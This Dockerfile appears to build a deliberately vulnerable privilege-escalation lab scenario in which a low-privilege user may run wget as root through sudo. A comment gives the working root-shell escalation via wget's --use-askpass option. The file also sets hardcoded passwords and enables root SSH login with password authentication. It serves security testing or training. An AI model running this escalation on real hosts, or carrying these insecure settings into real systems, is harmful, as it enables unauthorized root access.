FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_wget
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/wget as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and wget
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        wget \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify wget is installed
RUN which wget && ls -la /usr/bin/wget

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# wget supports --use-askpass which executes an arbitrary program to get a password.
# When run as root via sudo, this allows executing arbitrary commands as root:
#   echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/shell.sh
#   chmod +x /tmp/shell.sh
#   sudo wget --use-askpass=/tmp/shell.sh 0
# This spawns a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/wget" > /etc/sudoers.d/wget && \
    chmod 440 /etc/sudoers.d/wget

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]